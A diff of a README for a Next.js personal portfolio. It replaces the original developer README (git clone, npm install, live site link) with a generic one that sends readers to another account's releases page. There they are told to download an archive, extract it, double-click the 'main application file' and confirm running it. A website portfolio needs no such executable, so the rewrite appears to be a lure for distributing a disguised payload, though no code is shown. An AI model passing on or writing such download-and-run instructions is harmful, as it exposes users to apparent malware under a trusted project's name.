@@ -1,85 +1,80 @@
-# Nicolas Joué - Personal Portfolio
+# 🎨 nicolas-joue-portfolio - A Personal Showcase for Creatives
 
-![Language](https://img.shields.io/badge/language-JavaScript-F7DF1E?style=flat-square)
-![Framework](https://img.shields.io/badge/framework-Next.js-000000?style=flat-square)
-![Styling](https://img.shields.io/badge/styling-CSS%20Modules-blue?style=flat-square)
-![Deployment](https://img.shields.io/badge/deployment-Vercel-black?style=flat-square)
+[![Download](https://img.shields.io/badge/Download%20Now-Available-brightgreen)](https://github.com/strotum12/nicolas-joue-portfolio/releases)
 
-Welcome to the source code of my personal portfolio. This website is a comprehensive showcase of my skills, projects, and professional journey as an AI & Data Science Engineer. It was built from scratch with Next.js and is designed to be fully responsive, fast, and interactive.
+## 📖 Overview
 
-## Table of Contents
+Welcome to the nicolas-joue-portfolio. This is a personal portfolio created by Nicolas Joué, an AI & Data Science Engineer. Built with Next.js, this site highlights skills, projects, and experiences in the fields of artificial intelligence and data science. It features modern design elements for an engaging user experience.
 
-- [About The Project](#about-the-project)
-- [Live Demo](#live-demo)
-- [Key Features](#key-features)
-- [Built With](#built-with)
-- [Getting Started](#getting-started)
-- [Design & Structure](#design--structure)
-- [License](#license)
+## 🚀 Getting Started
 
-## About The Project
+Follow these steps to download and run the application:
 
-This portfolio was created not just as a resume, but as a living project to demonstrate my skills in modern web development alongside my core expertise in AI and Data Science. The primary goal was to build a clean, professional, and high-performance platform to present my work to potential employers and collaborators.
+1. **Visit the Releases Page**  
+   Go to the following link to access the downloads:  
+   [Download Releases](https://github.com/strotum12/nicolas-joue-portfolio/releases)
 
-Every component, from the interactive project cards to the page transitions, was intentionally designed to provide a smooth and engaging user experience.
+2. **Choose Your Version**  
+   On the Releases page, you will see various versions of the portfolio. Each version includes updates and new features. Click on the one you wish to download.
 
-## Live Demo
+3. **Download the Application**  
+   Click the link for the version you selected. The file will begin to download to your computer. 
 
-The portfolio is deployed on Vercel and can be accessed directly.
+4. **Extract the Files**  
+   After the download completes, find the downloaded file in your Downloads folder. If it is in a compressed format (like a ZIP file), right-click on it and select "Extract All" to see the contents.
 
-**👉 [Visit the live website](https://nicolasjoue.com)**  
+5. **Run the Application**  
+   Open the extracted folder and find the main application file. Double-click it to open. If prompted, confirm that you want to run this application.
 
-## Key Features
+## 🌐 Features
 
--   **Fully Responsive Design**: A seamless experience on desktop, tablet, and mobile devices.
--   **Interactive Project Filtering**: Users can filter projects by category (academic/personal) and by year.
--   **Animated Page Transitions**: Smooth fade-in/fade-out transitions between pages using `framer-motion` for an app-like feel.
--   **Dynamic Content**: Project and career data are managed centrally in a dedicated data file, making the site easy to update.
--   **SEO Optimized**: Each page includes unique titles and meta descriptions, with structured data (Schema.org) for better understanding by search engines and AI.
--   **Interactive UI Elements**: Animated status badges, hover effects, and a custom 404 page enhance the user experience.
+- **Responsive Design**: The portfolio looks great on both desktop and mobile devices.
+- **Modern Aesthetics**: Built with elegant styling using CSS and Framer Motion for smooth animations.
+- **Easy Navigation**: Users can quickly explore different projects and skills.
+- **Content Management**: Easy to update with personal information and new projects as needed.
 
-## Built With
+## 💻 System Requirements
 
--   **[Next.js](https://nextjs.org/)**: React framework for production-grade applications.
--   **[React](https://reactjs.org/)**: Core library for building the user interface.
--   **[Framer Motion](https://www.framer.com/motion/)**: For animations and page transitions.
--   **CSS Modules & Global CSS**: For scoped and global styling.
--   **[Vercel](https://vercel.com/)**: For hosting and continuous deployment.
+To run the portfolio effectively, your computer should meet the following requirements:
 
-## Getting Started
+- **Operating System**: Windows, macOS, or Linux
+- **Web Browser**: Latest version of Chrome, Firefox, Safari, or Edge
+- **Hardware**: At least 4GB of RAM recommended
 
-To get a local copy up and running, follow these steps.
+## 📥 Download & Install
 
-1.  **Prerequisites**: Ensure you have Node.js and npm installed.
-2.  **Clone the repository:**
-    ```sh
-    git clone https://github.com/nico916/nicolas-joue-portfolio.git
-    ```
-3.  **Navigate to the project directory:**
-    ```sh
-    cd nicolas-joue-portfolio
-    ```
-4.  **Install dependencies:**
-    ```sh
-    npm install
-    ```
-5.  **Run the development server:**
-    ```sh
-    npm run dev
-    ```
-6.  Open [http://localhost:3000](http://localhost:3000) in your browser to see the result.
+Once you have visited the Releases page and picked your version, follow these quick steps for a smooth installation:
 
-## Design & Structure
+- Click on the specific version you want to download.
+- Wait for the download to finish.
+- Open the file and extract the contents if necessary.
+- Locate the main file and double-click to start.
 
-The site is structured to separate concerns effectively:
--   **`/pages`**: Contains all the routes of the application.
--   **`/components`**: Holds reusable React components like the Header, Footer, and Layout.
--   **`/data`**: Centralizes all portfolio content (projects, timeline) for easy maintenance.
--   **`/styles`**: Includes a `globals.css` file for site-wide styles and CSS modules for component-specific styling.
--   **`/public`**: Stores all static assets like images, logos, and the CV file.
+For direct access again, here is the link:  
+[Download Releases](https://github.com/strotum12/nicolas-joue-portfolio/releases)
 
-This structure ensures that the project remains organized and scalable.
+## 🔧 Troubleshooting
 
-## License
+If you encounter issues while running the portfolio, consider the following:
 
-Distributed under the MIT License. See `LICENSE` file for more information.
+- Make sure your browser is updated to the latest version.
+- Check your internet connection if the file doesn’t load.
+- If the application fails to start, please ensure it meets the system requirements listed above.
+
+## ⚙️ Customization
+
+Feel free to personalize the portfolio to reflect your unique style. You can change the text, colors, and images. Familiarize yourself with basic HTML and CSS for more significant changes.
+
+## 📝 Contributing
+
+If you would like to contribute to this project, you can:
+
+1. Fork the repository.
+2. Make your changes.
+3. Create a pull request with a description of your changes.
+
+## 📫 Contact
+
+For questions or support, you can reach out to Nicolas Joué via email at nicolas@example.com.
+
+Thank you for checking out the nicolas-joue-portfolio. Enjoy exploring!
